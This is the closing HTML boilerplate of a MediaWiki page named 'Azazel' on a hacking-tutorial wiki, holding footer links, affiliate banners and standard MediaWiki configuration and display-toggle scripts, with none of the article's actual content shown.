		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>

	</ul>
</div>
</div>

<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Azazel", "wgTitle": "Azazel", "wgAction": "view", "wgArticleId": 36688, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 46590, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script type="text/javascript"> 
function toggleDisplay( id, hidetext, showtext )
{
  link = document.getElementById( id + "l" ).childNodes[0];
 
  with( document.getElementById( id ).style )
    {
      if( display == "none" )
	{
	  display = "inline";
	  link.nodeValue = hidetext;
	}
      else
	{
	  display = "none";
	  link.nodeValue = showtext;
	}
    }
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script><!-- Served in 0.478 secs. --></body></html>
